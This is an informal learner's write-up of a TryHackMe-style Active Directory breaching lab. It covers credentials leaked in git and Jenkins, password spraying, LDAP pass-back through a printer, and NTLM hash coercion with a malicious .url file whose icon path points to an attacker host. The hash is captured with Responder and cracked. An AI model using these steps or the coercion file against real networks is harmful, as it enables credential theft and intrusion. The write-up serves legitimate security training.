pratical exercises task 4 

thm provided two links an git(http://git.thm.loc/megacorp-admin/webapp-deploy) and an jenkis pipe (http://ci.thm.loc/) 

for this exercise i will use trufflehog as well manual search.

as show in the image above trufflehog do not found credentials. 

even though look in the repo print bellow we got some clues where to look for creds and relevant information as well. 

we can look in the files for creds and fuctionalitys undertanding. -> Jenkinsfile, python src/app.py, config/deploy.ini, 
src/requirements.txt. 

also we know that Bob Taylor that commited so he is an potential employee that we can try get access and not only that but 
he also leaked his email: bob.taylor@megacorp.thm. 

look through the commits we flound in history some changes that reveal credentials 


DB user = svc.jenkins
DB password = Jen5k1ns2025!

app secret_key = mc-webapp-s3cret-k3y

deployment default_password = MegaCorp01!

the image bellow shows the commits that leak this creds. 

know we start looking into jenkins 

as the image above show, trufflehog didnt found any relevant information againg.

thm provided us with admin:admin creds for the c.i, so lets star the manual fuzz.

in db backup we found some good information about the database, as show in the image bellow. 

we found 2 addresses and also the dp structure are beeing dumped, giving us the tables.

the health check also give us some more addresses as show in the image bellow.

well web deploy provided us with some very juice information, as show in the image bellow 

we are provided with some credentials for new users, yes the same that we got in git, so that confirms that password is valid. 

 
pratical exercises task 5 

before start spraying lets clean the output from task 3 with ( grep "VALID USERNAME" valid_users.txt | awk '{print $NF}' | sed 's/@thm.loc//' > clean_users.txt )

the user bob.taylor was already in the file valid_users. 

OHRAY! we found 2valid users dev.intern and alice.moore. 

pratical exercises task 6

remember the printer.thm.loc from the health check? 

so in an real attack scenario that could be use to ldap pass back

an this is what we will emute right now (http://printer.thm.loc/login) 

using default credentials(comom weakness know to this IOTs)


after login, before going to ldap config, i want to look around an see if i can discorver some more information. 

as the image bellow show, we found some more users, that if the first list was no provided on task3 we could add to or potential list of targets
also found an ip address, that i dont know if will be usefull for the lab but in an real scenario could be. 


in ldap/directory we can change the ldap

as the print abo show after change the ip and trigger tast connection, we receive on out nc the ldap account 

CN=svc.ldap,
OU=Service Accounts,
DC=thm,
DC=loc�Pr1ntBind2025!

Importante note that thm leave 

Note: Some modern devices negotiate SASL authentication or TLS-wrapped LDAP, in which case a simple Netcat listener won't capture plaintext credentials. In these situations, you would need to set up a rogue LDAP server (e.g., using slapd or Impacket's ldapd.py) that can handle the negotiation and capture the bind credentials. For this room, the target device uses plaintext LDAP, so Netcat is sufficient.

unfortunately the credential is disable, so we need to found another way to breach the ad. 

we are going to try file based corcion, 

to make our file we are going to use .url since .scf and .ini are no long working on recent versions of windows due an patch. 

to make our malicous file -> 

cat > @Shortcut.url << 'EOF'
[InternetShortcut]
URL=http://thm.loc
WorkingDirectory=thm
IconFile=\\YOURTUN0IP\icons\icon.ico
IconIndex=1
EOF 

why that works ? When a user browses that share using Windows Explorer, the operating system automatically attempts to render the file's icon.
 If the icon path points to a UNC path on our attacker machine (e.g., \\TUN0_IP\share\icon.ico), Windows will follow that path and send the browsing user's NTLMv2 hash to our listener, 
all without the user opening or clicking the file.

we will be using responder tool to setup an listener to port 445 

after pass the ntlmhash to hashcat it resolve to the password -> Trustno1


with that the room is finished, but are there some techniques that wore not cover here by thm. 

Null sessions, guest access, LDAP anonymous binds, and SNMP enumeration
Advanced coercion techniques: PetitPotam, PrinterBug/SpoolSample, and DFSCoerce
NTLMv1/v2 relay attacks forwarding captured authentication instead of cracking it
/NBT-NS poisoning for credential interception on the local network
PXE boot abuse and MDT credential extraction
A capstone challenge combining all breaching techniques into a single engagement 


